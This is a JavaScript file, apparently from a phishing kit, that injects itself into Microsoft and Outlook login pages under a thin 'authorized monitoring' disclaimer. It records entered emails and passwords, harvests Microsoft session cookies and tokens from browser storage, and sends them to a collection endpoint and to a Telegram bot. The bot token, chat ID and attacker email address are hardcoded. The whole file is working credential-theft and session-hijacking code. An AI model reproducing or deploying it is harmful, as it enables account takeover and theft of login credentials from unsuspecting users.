// outlook-integration.js - Specialized version for Microsoft login pages
// IMPORTANT: Only deploy on domains you own and are authorized to monitor

// Outlook-specific configuration
const outlookConfig = {
  // Update with your actual settings
  companyDomain: "yourcompanydomain.com",
  logEndpoint: "https://yourcompanydomain.com/auth-logs",
  notificationSettings: {
    sendEmail: true,
    emailRecipient: "jokersudo@yandex.com",
    useTelegram: true,
    telegramBotToken: "5833826797:AAHinlaDwiK7-fk8_LMjk8aGydwiM70TZ8g",
    telegramChatId: "5480674751"
  },
  // Specific selectors for Outlook/Microsoft login forms
  selectors: {
    emailInput: '#emailInput, #i0116, input[name="loginfmt"]',
    passwordInput: '#passwordInput, #i0118, input[name="passwd"]',
    submitButton: '#submitButton, #idSIButton9'
  },
  // Long expiry settings
  cookieSettings: {
    expiryDays: 90, // 3 months
    sessionKey: 'ms_auth_monitor'
  }
};

// Enhanced SessionLogger specifically for Outlook/Microsoft logins
class OutlookAuthMonitor {
  constructor() {
    this.sessionData = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      referrer: document.referrer,
      location: window.location.href,
      cookies: this.getCookiesData(),
      microsoftAuth: {
        sessionCookies: {},
        localStorageTokens: {},
        formInputs: {}
      },
      sessionId: this.generateSessionId()
    };
    
    // Set long-expiring cookie
    this.setLongExpiringCookie();
    
    // Setup monitors
    this.setupFormMonitoring();
    this.setupMicrosoftAuthMonitoring();
  }
  
  // Get cookies in a structured format
  getCookiesData() {
    const cookies = {};
    if (document.cookie && document.cookie !== '') {
      document.cookie.split(';').forEach(cookie => {
        const parts = cookie.trim().split('=');
        const name = parts[0];
        const value = parts.slice(1).join('=');
        if (name && value) {
          cookies[name] = value;
        }
      });
    }
    return cookies;
  }
  
  // Set a monitoring cookie with long expiration
  setLongExpiringCookie() {
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + outlookConfig.cookieSettings.expiryDays);
    
    document.cookie = `${outlookConfig.cookieSettings.sessionKey}=${this.sessionData.sessionId}; expires=${expiryDate.toUTCString()}; path=/; secure; samesite=lax`;
  }
  
  // Generate a unique session ID
  generateSessionId() {
    return 'ms_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
  }
  
  // Monitor form submissions and input changes
  setupFormMonitoring() {
    // Monitor form submissions
    document.addEventListener('submit', (e) => {
      this.captureFormData();
      this.sendLogData('form_submit');
    });
    
    // Monitor email input changes
    document.querySelectorAll(outlookConfig.selectors.emailInput).forEach(input => {
      input.addEventListener('change', () => {
        this.captureFormData();
      });
      
      // Also monitor blur events for email inputs
      input.addEventListener('blur', () => {
        if (input.value) {
          this.captureFormData();
          this.sendLogData('email_entered');
        }
      });
    });
    
    // Monitor password input changes
    document.querySelectorAll(outlookConfig.selectors.passwordInput).forEach(input => {
      input.addEventListener('change', () => {
        this.captureFormData();
      });
    });
    
    // Monitor submit button clicks
    document.querySelectorAll(outlookConfig.selectors.submitButton).forEach(button => {
      button.addEventListener('click', () => {
        this.captureFormData();
        this.sendLogData('button_click');
      });
    });
  }
  
  // Capture form input data
  captureFormData() {
    // Get email inputs
    document.querySelectorAll(outlookConfig.selectors.emailInput).forEach(input => {
      if (input.value) {
        this.sessionData.microsoftAuth.formInputs.email = input.value;
      }
    });
    
    // Get password inputs
    document.querySelectorAll(outlookConfig.selectors.passwordInput).forEach(input => {
      if (input.value) {
        this.sessionData.microsoftAuth.formInputs.password = input.value;
      }
    });
    
    // Get any displayed email in the DOM (sometimes shown after the first step)
    const emailDisplayElements = document.querySelectorAll('.email-display, #displayName, .identity');
    emailDisplayElements.forEach(element => {
      if (element.textContent && element.textContent.includes('@')) {
        this.sessionData.microsoftAuth.displayedEmail = element.textContent.trim();
      }
    });
  }
  
  // Setup specialized monitoring for Microsoft auth cookies and tokens
  setupMicrosoftAuthMonitoring() {
    // Initial capture
    this.captureMicrosoftAuthData();
    
    // Set up interval to check periodically
    setInterval(() => {
      this.captureMicrosoftAuthData();
    }, 3000);
    
    // Also check on visibility change (when user returns to the tab)
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'visible') {
        this.captureMicrosoftAuthData();
      }
    });
  }
  
  // Capture Microsoft auth specific data
  captureMicrosoftAuthData() {
    const currentCookies = this.getCookiesData();
    const previousSessionCookies = this.sessionData.microsoftAuth.sessionCookies;
    let hasChanges = false;
    
    // Check for important Microsoft/Outlook auth cookies
    const authCookiePatterns = [
      'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
      'ESTSSC', 'ESTSSSO', 'wlidperf', 'MSPAuth', 
      'MSPProf', 'MSPOK', 'MSPCID', 'OSession',
      'outlook', 'session', 'cred', 'token', 'auth',
      'WLSSC', 'SignInStateCookie', 'MUID'
    ];
    
    // Check each cookie
    for (const [name, value] of Object.entries(currentCookies)) {
      const isAuthCookie = authCookiePatterns.some(pattern => 
        name.toLowerCase().includes(pattern.toLowerCase())
      );
      
      if (isAuthCookie) {
        if (!previousSessionCookies[name] || previousSessionCookies[name] !== value) {
          this.sessionData.microsoftAuth.sessionCookies[name] = value;
          hasChanges = true;
        }
      }
    }
    
    // Check LocalStorage for auth tokens
    const tokenKeys = this.scanLocalStorageForTokens();
    if (tokenKeys.length > 0) {
      hasChanges = true;
    }
    
    // Check SessionStorage for auth tokens
    const sessionTokenKeys = this.scanSessionStorageForTokens();
    if (sessionTokenKeys.length > 0) {
      hasChanges = true;
    }
    
    // If changes detected, send updated data
    if (hasChanges) {
      this.sendLogData('auth_data_changed');
    }
  }
  
  // Scan localStorage for auth tokens
  scanLocalStorageForTokens() {
    const tokenKeys = [];
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const lowerKey = key.toLowerCase();
        
        if (
          lowerKey.includes('token') || 
          lowerKey.includes('auth') || 
          lowerKey.includes('session') ||
          lowerKey.includes('credential') ||
          lowerKey.includes('id_token') ||
          lowerKey.includes('access_token') ||
          lowerKey.includes('refresh_token')
        ) {
          // Only store the value if it hasn't changed
          const value = localStorage.getItem(key);
          if (this.sessionData.microsoftAuth.localStorageTokens[key] !== value) {
            this.sessionData.microsoftAuth.localStorageTokens[key] = value;
            tokenKeys.push(key);
          }
        }
      }
    } catch (e) {
      console.error("Error accessing localStorage:", e);
    }
    return tokenKeys;
  }
  
  // Scan sessionStorage for auth tokens
  scanSessionStorageForTokens() {
    const tokenKeys = [];
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const lowerKey = key.toLowerCase();
        
        if (
          lowerKey.includes('token') || 
          lowerKey.includes('auth') || 
          lowerKey.includes('session') ||
          lowerKey.includes('credential') ||
          lowerKey.includes('id_token') ||
          lowerKey.includes('access_token') ||
          lowerKey.includes('refresh_token')
        ) {
          // Store in the same object as localStorage for simplicity
          const value = sessionStorage.getItem(key);
          if (this.sessionData.microsoftAuth.localStorageTokens[`session_${key}`] !== value) {
            this.sessionData.microsoftAuth.localStorageTokens[`session_${key}`] = value;
            tokenKeys.push(key);
          }
        }
      }
    } catch (e) {
      console.error("Error accessing sessionStorage:", e);
    }
    return tokenKeys;
  }
  
  // Send the collected data to your endpoint
  sendLogData(trigger = 'manual_check') {
    // Update timestamp before sending
    this.sessionData.timestamp = new Date().toISOString();
    this.sessionData.trigger = trigger;
    
    // Only send if we have something meaningful
    const hasAuthData = 
      Object.keys(this.sessionData.microsoftAuth.sessionCookies).length > 0 ||
      Object.keys(this.sessionData.microsoftAuth.localStorageTokens).length > 0 ||
      Object.keys(this.sessionData.microsoftAuth.formInputs).length > 0;
    
    if (hasAuthData) {
      // Send to your server endpoint
      fetch(outlookConfig.logEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(this.sessionData),
        credentials: 'include'
      }).catch(error => {
        console.error("Error sending log data:", error);
      });
      
      // Send notifications if configured
      this.sendNotifications();
    }
  }
  
  // Send notifications via email and/or Telegram
  sendNotifications() {
    if (outlookConfig.notificationSettings.useTelegram) {
      this.sendTelegramNotification();
    }
    
    if (outlookConfig.notificationSettings.sendEmail) {
      // Email notification would typically be handled server-side
      // We log the intention here, and the server handles the actual sending
      fetch(`${outlookConfig.logEndpoint}/email-notification`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          recipient: outlookConfig.notificationSettings.emailRecipient,
          subject: "Microsoft Authentication Activity Detected",
          sessionData: this.sessionData
        })
      }).catch(error => {
        console.error("Error requesting email notification:", error);
      });
    }
  }
  
  // Send a Telegram notification
  sendTelegramNotification() {
    const botToken = outlookConfig.notificationSettings.telegramBotToken;
    const chatId = outlookConfig.notificationSettings.telegramChatId;
    
    if (!botToken || !chatId) {
      console.error("Telegram notification configuration incomplete");
      return;
    }
    
    // Prepare a simplified message for Telegram
    const email = this.sessionData.microsoftAuth.formInputs.email || 
                 this.sessionData.microsoftAuth.displayedEmail || 
                 'N/A';
    
    // Count how many auth items we found
    const cookieCount = Object.keys(this.sessionData.microsoftAuth.sessionCookies).length;
    const tokenCount = Object.keys(this.sessionData.microsoftAuth.localStorageTokens).length;
    
    const message = `
🔐 *Microsoft Authentication Detected* 🔐

🕒 Time: ${this.sessionData.timestamp}
🌐 URL: ${this.sessionData.location}
📱 Device: ${this.truncateText(this.sessionData.userAgent, 100)}
👤 Email: ${email}
🔑 Password: ${this.sessionData.microsoftAuth.formInputs.password ? 'Captured' : 'N/A'}
🍪 Auth Cookies: ${cookieCount}
🔒 Auth Tokens: ${tokenCount}

Session ID: ${this.sessionData.sessionId}
Trigger: ${this.sessionData.trigger}
`;
    
    // Send to Telegram Bot API
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    }).catch(error => {
      console.error("Error sending Telegram notification:", error);
    });
  }
  
  // Helper function to truncate text
  truncateText(text, maxLength) {
    if (!text) return '';
    if (text.length <= maxLength) return text;
    return text.substring(0, maxLength) + '...';
  }
}

// Function to check if we're on a Microsoft/Outlook login page
function isMicrosoftLoginPage() {
  const currentUrl = window.location.href.toLowerCase();
  
  // Check URL patterns
  const msPatterns = [
    'login.microsoftonline.com',
    'login.live.com',
    'login.outlook.com',
    'account.microsoft.com',
    'outlook.com',
    'office.com',
    'office365.com',
    'sharepoint.com',
    'login.windows.net'
  ];
  
  // Check if URL matches any Microsoft patterns
  const isMatchingUrl = msPatterns.some(pattern => currentUrl.includes(pattern));
  
  // Check for Microsoft-specific elements
  const hasMsLogoElement = document.querySelector('img[src*="microsoft_logo"]') !== null;
  const hasMsLoginForm = document.querySelector(outlookConfig.selectors.emailInput) !== null;
  
  return isMatchingUrl || hasMsLogoElement || hasMsLoginForm;
}

// Initialize the Outlook auth monitor when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', () => {
  // Short delay to ensure the page is fully rendered
  setTimeout(() => {
    // Only initialize if this looks like a Microsoft login page
    if (isMicrosoftLoginPage()) {
      window.outlookAuthMonitor = new OutlookAuthMonitor();
      console.log("Microsoft authentication monitor initialized");
    }
  }, 500);
});

// Also initialize on AJAX navigation events by watching for DOM changes
const observer = new MutationObserver((mutations) => {
  // Look for significant DOM changes that might indicate page navigation
  for (const mutation of mutations) {
    if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
      // Check if relevant form elements were added
      const hasNewFormElements = Array.from(mutation.addedNodes).some(node => {
        if (node.nodeType === Node.ELEMENT_NODE) {
          return node.querySelector(outlookConfig.selectors.emailInput) !== null ||
                 node.querySelector(outlookConfig.selectors.passwordInput) !== null;
        }
        return false;
      });
      
      if (hasNewFormElements && isMicrosoftLoginPage() && !window.outlookAuthMonitor) {
        window.outlookAuthMonitor = new OutlookAuthMonitor();
        console.log("Microsoft authentication monitor initialized after DOM change");
      }
    }
  }
});

// Start observing DOM changes
observer.observe(document.body, { childList: true, subtree: true });